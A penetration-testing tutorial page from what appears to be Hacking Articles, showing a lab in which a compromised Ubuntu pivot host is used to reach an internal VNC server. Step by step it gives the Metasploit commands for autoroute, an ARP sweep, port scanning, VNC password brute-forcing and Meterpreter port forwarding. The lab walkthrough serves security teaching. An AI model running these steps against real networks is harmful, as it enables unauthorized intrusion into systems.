<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/tunneling-pivoting/" rel="category tag">Tunneling &amp; Pivoting</a></span>            </div>
            <h1 class="post-title entry-title">VNC Pivoting through Meterpreter</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/vnc-pivoting-meterpreter/" rel="bookmark"><time class="entry-date published" datetime="2017-10-02T16:55:13+00:00">October 2, 2017</time><time class="updated" datetime="2025-06-02T05:53:09+00:00">June 2, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In the previous article we had described <a href="http://www.hackingarticles.in/vnc-penetration-testing/"><strong>VNC penetration testing</strong></a> and <a href="http://www.hackingarticles.in/vnc-tunneling-ssh/"><strong>VNC tunneling through SSH</strong></a> but today we are going to demonstrate VNC pivoting.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;">From Offensive Security</span></p>
<p class="ai-optimize-8"><span style="color: #000000;"><strong>Pivoting</strong> is a technique to get inside an unreachable network with help of pivot (center point). In simple words, it is an attack through which an attacker can exploit those systems which belong to the different network. For this attack, the attacker needs to exploit the main server that helps the attacker to add himself inside its local network and then the attacker will able to target the client system for the attack.</span></p>
<h4 class="ai-optimize-9"><span style="color: #000000;">Lab Setup requirement</span></h4>
<p class="ai-optimize-10"><span style="color: #000000;"><strong>Attacker Machine</strong>: Kali Linux</span></p>
<p class="ai-optimize-11"><span style="color: #000000;"><strong>Pivot Machine</strong>:  Ubuntu operating system with <strong>two </strong>network interface</span></p>
<p class="ai-optimize-12"><span style="color: #000000;">Target Machine: Ubuntu (Allow VNC service)</span></p>
<p class="ai-optimize-13"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OxfPtaxgGEA/WdJtcz9GK-I/AAAAAAAARxY/BqccVBJ7OKkAL5iE9kyKnmSaJlUKQtGJwCLcBGAs/s1600/11.png"/></span></p>
<h3 class="ai-optimize-14"><span style="color: #800000;">Exploit pivot machine</span></h3>
<p class="ai-optimize-15"><span style="color: #000000;">Generate payload using msfvenom start multi/handler to hack the pivot machine (ubuntu) read the complete article from <strong>here</strong> and bypass its UAC to achieve admin privileges.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo</pre>
<p class="ai-optimize-16"><span style="color: #000000;"><strong> </strong>From the given image you can confirm that I owned a pivot machine (192.168.1.226) meterpreter session.</span></p>
<p class="ai-optimize-17"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zR_6L0cwp5o/WdJtdPciXEI/AAAAAAAARxc/tjcTXVvTatEGBJ9VXkjoxjI4ptNjePhugCLcBGAs/s1600/12.png"/></span></p>
<p class="ai-optimize-18"><span style="color: #000000;">Check the network interface through the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter&gt; ifconfig</pre>
<p class="ai-optimize-19"><span style="color: #000000;">From the given image you can observe two networks interface in pivot’s system <strong>1</strong><strong><sup>st</sup></strong><strong> </strong>for IP <strong>192.168.1.226 </strong>through which the attacker is connected and <strong>2</strong><strong><sup>nd</sup></strong> for IP <strong>10.0.0.10 </strong>through which VNC server (targets) are connected.</span></p>
<p class="ai-optimize-20"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-UH7xx63qqMw/WdJtdD0ZOWI/AAAAAAAARxg/mWSuS-dDuc8l-QajqFd2DnU-JsGLHaFyACLcBGAs/s1600/13.png"/></span></p>
<h3 class="ai-optimize-21"><span style="color: #800000;"><strong>Route Add</strong></span></h3>
<p class="ai-optimize-22"><span style="color: #000000;">Since the attacker belongs to the <strong>192.168.1.1</strong> interface and client belongs to <strong>10.0.0.0 </strong>interface, therefore, it is not possible to directly make an attack on client network until unless the attacker acquires the same network connection. In order to achieve a 10.0.0.0 network attacker need to run the <strong>post exploitation</strong> “autoroute”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/manage/autoroute
msf post(autoroute) &gt; set session 3
msf post(autoroute) &gt; exploit</pre>
<p class="ai-optimize-23"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-JtKqHypEi8E/WdJtdr8UtxI/AAAAAAAARxk/94-l01wzj5Id8pe677PQbwNIM089WHy5wCLcBGAs/s1600/15.png"/></span></p>
<h3 class="ai-optimize-24"><span style="color: #800000;"><strong>ARP Sweep to identify Active host </strong></span></h3>
<p class="ai-optimize-25"><span style="color: #000000;">This module will enumerate alive Hosts in the local network using ARP requests. Take help from target network interface 3 as shown above for MAC address and other details.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/discovery/arp_sweep
msf auxiliary(arp_sweep) &gt;set rhost 10.0.0.1-254
msf auxiliary(arp_sweep) &gt;set shost 10.0.0.10
msf auxiliary(arp_sweep) &gt;set smac 00:0c:29:bf:43:94
msf auxiliary(arp_sweep) &gt;run</pre>
<p class="ai-optimize-26"><span style="color: #000000;">Here we found a new host IP <strong>10.0.0.20</strong> as shown in the given image. Let’s perform TCP port scan for activated services on this machine.</span></p>
<p class="ai-optimize-27"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iPzsNs96XXc/WdJtdgQWq_I/AAAAAAAARxo/K_QHuq5wj9Ug5usLp4T4Gn8fda_jq3TnwCLcBGAs/s1600/16.png"/></span></p>
<h3 class="ai-optimize-28"><span style="color: #800000;"><strong>TCP Port Scan</strong></span></h3>
<p class="ai-optimize-29"><span style="color: #000000;">This module will enumerate open TCP port of the target system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) &gt; set rhosts 10.0.0.20
msf auxiliary(tcp) &gt; set thread 20
msf auxiliary(tcp) &gt;exploit</pre>
<p class="ai-optimize-30"><span style="color: #000000;">From the given, you can observe that <strong>port 5900</strong> is<strong> open </strong>and we know that 5900 used for VNC services.</span></p>
<p class="ai-optimize-31"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-tz2KjiFv0GE/WdJtd7BV-XI/AAAAAAAARxs/cjdyKHF8POQpIvW7UgoxwNbh7iTF6z3BQCLcBGAs/s1600/17.png"/></span></p>
<h3 class="ai-optimize-32"><span style="color: #800000;">Brute-Forcing VNC Login</span></h3>
<p class="ai-optimize-33"><span style="color: #000000;">In order to steal password for making unauthorized access in VNC machine apply Brute force attack using password, the dictionary is given below exploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/vnc/vnc_login
msf auxiliary(vnc_login) &gt;set rhosts 10.0.0.20
msf auxiliary(vnc_login) &gt;set pass_file /root/Desktop/pass.txt
msf auxiliary(vnc_login) &gt; run</pre>
<p class="ai-optimize-34"><span style="color: #000000;"><strong>Awesome!!</strong> From given below image you can observe the same <strong>password: 123456</strong> have been found by Metasploit.</span></p>
<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-FWRXkU4oOtQ/WdJteTHHapI/AAAAAAAARx4/Y7JyUzR4tfoGDcGrgveJ1x9n2z_DOTzKACLcBGAs/s1600/18.png"/></span></p>
<h3 class="ai-optimize-36"><span style="color: #800000;">VNC Port forwarding on Local port</span></h3>
<p class="ai-optimize-37"><span style="color: #000000;">Now Type the following command for port forwarding on localhost.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter&gt; portfwd add –l 6000 –p 5900 –r 10.0.0.20</pre>
<p class="ai-optimize-38"><span style="color: #000000;">-l: This is a local port to listen on.</span></p>
<p class="ai-optimize-39"><span style="color: #000000;">-p: The remote port to connect to.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;">-r:  The remote host address to connect on.</span></p>
<p class="ai-optimize-41"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-8okgBDZDQr4/WdJteTzhhxI/AAAAAAAARxw/74ebcehdWlQ4_dX_o-qKlbQfS0fUzXQcgCLcBGAs/s1600/20.png"/></span></p>
<p class="ai-optimize-42"><span style="color: #000000;">Now open the terminal and type the following command to connect to the target machine:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">vncviewer 127.0.0.1:6000</pre>
<p class="ai-optimize-43"><span style="color: #000000;"><strong>Wonderful!!</strong> We had successfully exploited the VNC client by making unauthorized access.</span></p>
<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6ZdGuu2sQtk/WdJteeYOWdI/AAAAAAAARx0/dajjWGCWjkgXvdlKaTn6cW2w3rw-8moJgCLcBGAs/s1600/22.png"/></span></p>
<p class="ai-optimize-45"><span style="color: #000000;"><strong>Author</strong>: Sanjeet Kumar is an Information Security Analyst | Pentester | Researcher  Contact <a class="broken_link" href="https://www.linkedin.com/in/sanjeet-kumar-27828058/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
